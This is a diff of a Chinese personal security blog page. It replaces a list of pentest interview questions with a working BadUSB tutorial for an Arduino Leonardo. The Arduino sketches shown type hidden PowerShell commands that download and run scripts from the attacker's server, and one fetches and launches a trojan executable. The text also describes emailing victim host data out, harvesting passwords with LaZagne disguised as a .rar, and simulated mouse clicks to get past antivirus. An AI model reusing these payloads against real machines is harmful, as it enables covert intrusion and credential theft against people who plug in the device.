@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>Sunian&#39;s Blog</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Sunian&#39;s Blog">
+  <title>&#39;BadUSB制作&#39; | Sunian&#39;s Blog</title>
+  <meta name="keywords" content=" 渗透测试 ">
+  <meta name="description" content="&#39;BadUSB制作&#39; | Sunian&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="个人简历素念，男，19岁 现读于某大专院校，汽修专业，自学web安全 专注于研究渗透测试方向 web安全，内网，硬件，社工等 联系方式QQ：3504078815 邮箱：lingyu195@gmail.com">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/imgss/touxiang.jpg" />
@@ -681,12 +681,55 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-badusb制作" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#记一次360笔试题"><span class="toc-text">记一次360笔试题</span></a></li></ol>
+        <h1 class="article-title">&#39;BadUSB制作&#39;</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" data-rel="渗透测试">渗透测试</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color5">渗透测试</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-11-29 09:40:25'>2019-11-29 09:25</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#HID攻击原理"><span class="toc-text">HID攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#硬件准备"><span class="toc-text">硬件准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#函数介绍"><span class="toc-text">函数介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#软件驱动准备"><span class="toc-text">软件驱动准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试脚本"><span class="toc-text">测试脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#替换其他脚本"><span class="toc-text">替换其他脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arduino代码"><span class="toc-text">Arduino代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展代码"><span class="toc-text">扩展代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他过狗代码，自行研究"><span class="toc-text">其他过狗代码，自行研究</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -699,33 +742,54 @@
     }
 </style>
 </div>
-            <h3 id="记一次360笔试题"><a href="#记一次360笔试题" class="headerlink" title="记一次360笔试题"></a>记一次360笔试题</h3><ol>
-<li><p>如果存在SQL注入怎么判断不同的数据库。</p>
-</li>
-<li><p>简述下浏览器的自解码机制。</p>
-</li>
-<li><p>拿到目标站怎么进行渗透，需要注意什么。</p>
-</li>
-<li><p>CSRF漏洞的原理是什么？怎么修复？</p>
-</li>
-<li><p>代码审计怎么做？</p>
-</li>
-<li><p>哪些漏洞是WAF不能防御的？请举出至少三类漏洞。</p>
-</li>
-<li><p>考虑以下场景：一个多用户的博客系统（类似于CSDN），普通用户登陆到个人中心后，发现删除自己某篇文章所请求的URI为delete.php?article_id=24，请考虑这个地方最有可能出现哪些安全问题？</p>
-</li>
-<li><p>PHP5环境下，如果配置文件中magic_quotes_gpc为On，则PHP会对请求参数中的哪些字符进行自动转义？</p>
-</li>
-<li><p>使用sqlmap工具进行sql注入漏洞利用时，可以尝试使用（）选项获取一个操作系统shell。</p>
-</li>
-<li><p>渗透时后端环境是apache+php+mysql的情况下，利用sql注入写webshell一般来说需要满足三个条件：1.mysql用户需要有（）权限；2.需要知道（）路径；3.（）（符号）不能被过滤。</p>
-</li>
-</ol>
-<p>欢迎加入知识星球，获取参考答案及更多渗透资料<br><img src="/imgss/tu52.png" alt=""></p>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。简而言之，今天要介绍的Badusb利用的是虚拟键盘来实现恶意代码的执行。</p>
+<h3 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h3><p>(购买板子或购买有外壳的）<br><a href="https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473" target="_blank" rel="noopener">https://item.taobao.com/item.htm?spm=a1z09.2.0.0.3d1f2e8dNaX0hO&amp;id=589099911512&amp;_u=m2i3k6cqf473</a><br><a href="https://m.tb.cn/h.eFDEFMN?sm=e737b6" target="_blank" rel="noopener">https://m.tb.cn/h.eFDEFMN?sm=e737b6</a></p>
+<h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><p>Arduino IDE中使用的开发语言是C，一个程序在Arduino IDE中被成为 sketch，每个 sketch 都包含一个 setup 函数和一个 loop 函数。程序启动，首先调用 setup，这个函<br>数只被调用一次，loop 函数会被不停的重复调用下去。</p>
+<h3 id="软件驱动准备"><a href="#软件驱动准备" class="headerlink" title="软件驱动准备"></a>软件驱动准备</h3><p>编译器Arduino IDE，Teensyduino驱动，arduino驱动<br>（百度云盘直接下载ZIP，解压即可使用）<br>链接：<a href="https://pan.baidu.com/s/16lDkrlxU9BpCD7kKgGhJng" target="_blank" rel="noopener">https://pan.baidu.com/s/16lDkrlxU9BpCD7kKgGhJng</a><br>提取码：onqg<br>驱动准备<br><img src="/imgss/tu53.png" alt><br>Teensyduino安装，特别注意编译器版本需要在1.6.4以下<br><img src="/imgss/tu54.png" alt><br><img src="/imgss/tu55.png" alt><br><img src="/imgss/tu56.png" alt><br>选择all安装<br><img src="/imgss/tu57.png" alt><br>中途可能会出错，我重启下电脑就好了（没搞懂，报错说是不为管理员启动安装或杀毒软件运行）<br>可能这就是玄学重启吧<br><img src="/imgss/tu58.png" alt></p>
+<h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><p>打开编译器，测试脚本（循环模式2秒写一个hello world）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">setup</span></span>() &#123;</span><br><span class="line">  // put your setup code here, to run once:</span><br><span class="line">  Keyboard.print(<span class="string">"Hello World"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">loop</span></span>() &#123;</span><br><span class="line">  // put your main code here, to run repeatedly:</span><br><span class="line">  delay(2000);  // 暂停2秒</span><br><span class="line">  Keyboard.print(<span class="string">"Hello World"</span>);  // 模拟键盘输入</span><br></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<p><img src="/imgss/tu59.png" alt><br>先验证再上传<br>录入成功<br><img src="/imgss/tu60.png" alt></p>
+<h3 id="替换其他脚本"><a href="#替换其他脚本" class="headerlink" title="替换其他脚本"></a>替换其他脚本</h3><p>为确保我们的脚本能够完美地发送包含目标主机信息的邮件，我们需要开启smtp邮箱服务。本处我使用的是QQ邮箱，开启方法如下：<br>进入邮箱，点击设置-账户<br><img src="/imgss/tu61.png" alt><br>往下拉，开启前两个服务<br><img src="/imgss/tu62.png" alt><br>此过程需要验证密保~<br>即可获得“授权码”（即后文提到的邮箱密码）此处的邮箱密码并不是指QQ密码<br><img src="/imgss/tu63.png" alt><br>首先下载Badusb所需代码，代码已打包（见云盘链接）<br>修改2754行的IP地址为自己服务器IP<br><img src="/imgss/tu64.png" alt><br>修改main.ps1的2903-2919行 为发送邮件配置<br><img src="/imgss/tu65.png" alt><br>修改GetPass.ps1中的前两行，域名，Getpass.rar实际上是lazagne，用rar下载尽量避免触发安全软件，这个不放心可以百度下载。command.rar实为bat 因为 lazagne注入lsass时会被安全软件拦截，所以用bat避免注入。修改GetPass.ps1中的邮箱配置，同main.ps1中的就行<br><img src="/imgss/tu66.png" alt><br>将修改后的文件（共四个）上传到公网服务器，如利用Xshell，FinalShell等工具直接拖拽上传</p>
+<h3 id="Arduino代码"><a href="#Arduino代码" class="headerlink" title="Arduino代码"></a>Arduino代码</h3><p>1.打开Arduino IDE<br>2.工具-&gt;版-&gt;选择“Arduino Leonardo“<br>3，port选择COM3<br><img src="/imgss/tu67.png" alt></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">void <span class="function"><span class="title">setup</span></span>()&#123;//初始化 </span><br><span class="line">Keyboard.begin();//开始键盘通讯 </span><br><span class="line">delay(5000);//延时 </span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键 </span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//r键</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(<span class="string">'r'</span>); </span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">"CMD"</span>);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN); </span><br><span class="line">delay(3000);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/main.ps1') "</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">Keyboard.begin();//开始键盘通讯 </span><br><span class="line">delay(5000);//延时 </span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键 </span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//r键</span><br><span class="line">delay(500); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.release(<span class="string">'r'</span>); </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(<span class="string">"CMD"</span>);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN); </span><br><span class="line">delay(3000);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/payload.ps1') "</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN); </span><br><span class="line">Keyboard.release(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK); </span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125;</span><br><span class="line">void <span class="function"><span class="title">loop</span></span>() &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将代码中的8.8.8.8改为自己服务器IP<br>其实最主要的还是免杀。。。。。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>遇到困难不要轻易放弃，奥力给！百度/谷歌都是很好的帮手，另外思路要活。比如powershell默认设置是Restricted(脚本不能运行)，但是我们可以打开 运行 ，通过它来运行powershell脚本而不是打开powershell运行脚本，还有就是最后被拦截一样，换个思路，不一定要免杀马那么复杂的东西，运用badusb的特性一样可以绕过。</p>
+<h3 id="扩展代码"><a href="#扩展代码" class="headerlink" title="扩展代码"></a>扩展代码</h3><p>通过修改x，y的值，可通过模拟鼠标点击，绕过沙雕腾讯电脑管家</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">long basic;</span><br><span class="line">long x;</span><br><span class="line">long y;</span><br><span class="line">String powershell;</span><br><span class="line"></span><br><span class="line">void setup()</span><br><span class="line">&#123;</span><br><span class="line">  basic=9999999; </span><br><span class="line">  x=5000000;</span><br><span class="line">  y=5000000;</span><br><span class="line">  powershell=<span class="string">"powershell.exe  -WindowStyle Hidden -NoLogo  IEX (New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx.xxx/main.ps1');"</span>;</span><br><span class="line">  </span><br><span class="line">  Keyboard.begin();</span><br><span class="line">  Mouse.begin();</span><br><span class="line"></span><br><span class="line">  keyboard_gui();</span><br><span class="line">  keyboard_powershell();</span><br><span class="line">  mouse();</span><br><span class="line"></span><br><span class="line">  Mouse.end();</span><br><span class="line">  Keyboard.end();</span><br><span class="line">&#125;</span><br><span class="line">void keyboard_gui()</span><br><span class="line">&#123;</span><br><span class="line">  Keyboard.begin();</span><br><span class="line">  delay(1000);</span><br><span class="line">  delay(500);</span><br><span class="line">  Keyboard.press(KEY_LEFT_GUI); </span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.press(<span class="string">'r'</span>);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.releaseAll();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void keyboard_powershell()</span><br><span class="line">&#123;</span><br><span class="line">  Keyboard.println(powershell);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.press(KEY_RETURN);</span><br><span class="line">  delay(500); </span><br><span class="line">  Keyboard.release(KEY_RETURN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mouse()</span><br><span class="line">&#123;</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,-basic,0);</span><br><span class="line">  Mouse.move(-basic,0,0);</span><br><span class="line">  Mouse.move(0,-basic,0);  </span><br><span class="line">  Mouse.move(basic,basic,0);</span><br><span class="line">  Mouse.move(basic,0,0);</span><br><span class="line">  Mouse.move(x,y,0); </span><br><span class="line">  Mouse.click();</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.click();</span><br><span class="line">  delay(500);</span><br><span class="line">  Mouse.click();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">loop</span></span>() &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其他过狗代码，自行研究"><a href="#其他过狗代码，自行研究" class="headerlink" title="其他过狗代码，自行研究"></a>其他过狗代码，自行研究</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line">void <span class="function"><span class="title">setup</span></span>() &#123;//初始化</span><br><span class="line">Keyboard.begin();//开始键盘通讯</span><br><span class="line">delay(1000);//延时</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//win键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(‘r’);//r键</span><br><span class="line">delay(300);</span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//释放win 键</span><br><span class="line">Keyboard.release(‘r’);//释放R键</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK);//切换大小写，绕过输入法</span><br><span class="line">Keyboard.release(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.println(“cmd “);</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“powershell “);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“<span class="variable">$clnt</span> = new-object System.Net.WebClient; “);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“<span class="variable">$url</span>= ‘**********木马地址******’; “);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“<span class="variable">$file</span> = ‘ D:\\server.exe’; “);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>); “);</span><br><span class="line">Keyboard.press(KEY_RETURN);//按下回车键</span><br><span class="line">delay(200);</span><br><span class="line">Keyboard.release(KEY_RETURN);//按下回车键</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.println(“START D:\\server.exe “);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.release(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.end();//结束键盘通讯</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">loop</span></span>()&#123;&#125;//循环</span><br></pre></td></tr></table></figure>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在QQ私聊我，也可以邮件至 lingyu195@gmail.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>&#39;BadUSB制作&#39;</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="素念">素念</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-11-29, 09:25:04</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-29, 09:40:25</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/29/badusb制作/" title="&#39;BadUSB制作&#39;">http://yoursite.com/2019/11/29/badusb制作/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 sunian</p>
